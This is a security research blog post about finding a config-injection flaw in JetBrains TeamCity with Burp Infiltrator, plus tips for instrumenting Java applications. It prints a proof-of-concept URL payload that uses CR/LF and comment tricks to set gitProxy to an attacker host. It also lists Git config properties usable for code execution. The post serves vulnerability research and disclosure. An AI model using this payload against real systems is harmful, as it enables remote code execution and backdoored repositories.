# Behind enemy lines: bug hunting with Burp Infiltrator

Source: https://portswigger.net/blog/behind-enemy-lines-bug-hunting-with-burp-infiltrator
Fetched: 2026-06-28T09:15:07.522997+00:00

Behind enemy lines: bug hunting with Burp Infiltrator

Santiago Díaz |

Thursday, 22 June 2017 at 11:54 UTC

teamcity

iast

0day

infiltrator

In this article, I’ll demonstrate using Burp Infiltrator to identify an extremely versatile 0day in JetBrains’ TeamCity, a popular continuous integration server written in Java. Burp Infiltrator works by instrumenting target applications, injecting code to trace user input and help reveal obscure vulnerabilities that are extremely difficult to find using classical scanning techniques. I’ll also share some tips and techniques for using Infiltrator for maximum effectiveness. For a basic introduction to the Infiltrator, please refer to Introducing Burp Infiltrator.

Infiltrator injects code that sends a pingback to Burp Collaborator whenever it spots data supplied by Burp Scanner hitting a potentially vulnerable sink, like running a system command or making changes to the filesystem. This helps find vulnerabilities that might otherwise be masked by input transformations, input filtering or lack of output. It also reveals the code path traversed by the application to reach each dangerous API, making vulnerabilities easier to both patch and exploit.

A practical example: poisoning repository configuration files via filter bypass

I started by spraying the infiltrated application with Collaborator IDs by disabling every scan check except External Service Interaction, enabling Live Active Scanning and browsing as a normal user.

After exploring the application for a while I noticed there were a few interactions that followed the same pattern across a number of pages. These interactions showed that the application was creating a byte array from user input, then passing it to the FileInputStream.read method. This method is called by a class in the org.eclipse.jgit package, which is a dependency of TeamCity’s Git plugin.

I was getting these interactions from pages related to creating a new project from a repository URL, which means the URL was likely being written to the filesystem. Although I can’t tell where these contents are being written to, I know the exact contents of the byte array. See the following screenshot:

This is an interesting parameter value: some sort of property based file being built with user-supplied data. The actual string looks like this after decoding:

[core]

symlinks = false

repositoryformatversion = 0

filemode = true

bare = true

logallrefupdates = false

precomposeunicode = true

[teamcity]

remote = http://u94vddpu8vkqdi9ati21kd201r7jbozhn9a0yp.burpcollaborator.net

I immediately recognized this as a Git repository file configuration. This file format is very simple:

Sections are denoted as [sectionName], every section has a set of properties that are set with the propertyName = value format.

All strings after a semicolon or a hash are treated as comments.

The backslash escapes special characters.

Multiline property values are supported by adding a backslash at the end of the line.

My goal was to escape the TeamCity section and set properties in the core section where most of the juicy stuff is. I used the Collaborator client to generate a series of interaction IDs that I would use for my payloads. Consequently, every attempt to escape the remote property generated an Infiltrator interaction with the contents of the file. This setup provides a handy feedback loop that allows one to determine the effect of an input value after it has been transformed by multiple layers of code.

After playing with this method for a while I realized that all the URLs I came up with were being escaped correctly and although I could use the 0x0a character to enter a newline, it would still be in the context of the remote property. Moreover, certain bytes would make the org.apache.commons.httpclient.HttpMethodBase class raise an exception due to these being illegal in a URL.

I refined my payload after a few attempts and ended up with the following proof of concept:

http://fakerepo/%23;%0dremote=http://realrepo;%0a%0d[core];%0a%0dgitProxy=http://attacker:5555

That generated the following file:

[core]

… snip…

[teamcity]

remote = http://realrepo;”\nttp://fakerepo#;

[core];”\n\

gitProxy=http://attacker:5555

Breaking up the payload above we get: the %23 (#) character keeps HttpClient from throwing an exception as everything in the URL fragment is ignored. The %0d (CR) character returns the caret to the beginning of the line, effectively writing on top of the original property. The semicolon comments out the leftovers from the original content and also escapes the backslash added by TeamCity after it decodes %0a (LF).

This is a simple primitive that allows us to escape the current property and write arbitrary data to the top level of the properties hierarchy. The impact of setting some of these properties is vast, ranging from code execution to inserting backdoors in the codebase (on behalf of a legitimate developer) to forcing developers to fetch arbitrary code onto their machines.

There are dozens of properties that can be added that could potentially lead to remote code execution, see: core.sshCommand, core.editor, gpg.program, amongst many others. Other properties allow an attacker to set a repository specific proxy, change the way in which signatures are checked, set the location from where git hooks are loaded and much more.

The above is an example of finding a bug and writing a working proof of concept for it using Burp Infiltrator. But this is just the tip of the iceberg, spraying an infiltrated application with Collaborator URLs can produce very interesting results such as:

Asynchronous Infiltrator events.

SMTP Collaborator events drawn from input transformations reported as Infiltrator interactions.

Correlating seemingly unrelated insertion points from multiple Infiltrator interactions generated by the same API

Interactions that point to multiple ways of reaching the same vulnerable code path from different insertion points.

The what

Infiltrating an application is an iterative process; selecting the right target paths depends on the volume of interactions you want to get. Ideally we are only interested in the application’s bytecode and its dependencies, but nothing else. This is because the application may not instantiate, say, an XML parser of its own but it may instead use a library to handle XML parsing. If that’s the case and we don’t infiltrate the XML dependency we won’t see those Infiltrator interactions coming through, even if the Scanner reliably detects XML vulnerabilities.

Conversely, if we blindly infiltrate everything we may end up with misleading interactions. For instance, when a web server receives a request it’ll use its path to determine which application it should send this request to. The following screenshot shows an example of this:

It looks like there is a file traversal issue, but the call stack shows that no code outside the org.eclipse.jetty package was executed. This interaction clearly doesn’t come from the application but rather from the web server itself.

Spray your target application with Collaborator IDs, wait for Infiltrator interactions to arrive and adjust your target paths accordingly.

The when

It is important to decide when is the right time to infiltrate your target application. In general, we want to patch every class that relates to a user feature. Most applications can be infiltrated before they are deployed for the first time but there’s a number of situations in which this may not be the case.

An example of this is extensibility through plugins. Plugins broaden the attack surface of an application at runtime. In this case it’s better to install all the plugins you want to test first, add the location of those plugins to your list of target paths and redeploy the infiltrated application.

JSP pages are a special case that deserves to be mentioned. Briefly, JSP code gets translated into servlets and those in turn are compiled to Java bytecode. Most implementations of JSP do this on demand, that is: JSPs will be compiled only after they have been requested by a client. That means that Infiltrator won’t instrument JSP files because they are not Java bytecode initially. Nevertheless, users can get around this in a number of ways. For instance, by triggering JSP pre-compilation manually before the application is deployed, which will generate the required bytecode.

Ran into trouble?

Keep an eye on exceptions in the web server logs (or the application logging facilities) if you see strange behaviour or if your application fails to start after infiltrating. Modern applications routinely throw exceptions, so you may filter on the following types if you think there’s something wrong:

java.lang.ClassFormatError

java.lang.VerifyError

java.lang.NoClassDefFoundError

java.lang.StackOverflowError

These four types of exceptions are good indicators that some classes or archives are making assumptions that were broken by the patching process. Please submit a report if you do stumble upon any of these, your feedback helps improve the Infiltrator experience!

Conclusion

A patch for the repository configuration vulnerability was released in version 2017.1.2 on June 2 along with a clickjacking issue that was used as part of the reported PoC.

It might not be in the OWASP top 10 just yet but we think Infiltrator-augmented testing is a valuable addition to any hacker’s playbook, and highly recommend you give it a go when you get the chance. Infiltrating applications might sound daunting, but a little attentiveness to when and how the infiltration is performed may yield exotic vulnerabilities and unexpected insights.

teamcity

iast

0day

infiltrator

Santiago Díaz

Latest Posts

Burp Extensibility 2026: Awards, Talks, and Highlights

19 June 2026

Burp Extensibility 2026: Awards, Talks, and Highlights

The beast needs a cage: What's next for AppSec post-Mythos

12 May 2026

The beast needs a cage: What's next for AppSec post-Mythos

3 ways custom scan checks turn practitioner knowledge into scalable automation

01 May 2026

3 ways custom scan checks turn practitioner knowledge into scalable automation

Senior pentesters have a deeply refined intuition about what is vulnerable in an environment. The problem? That expertise is often siloed with an individual and trapped in their notes or Python scripts.
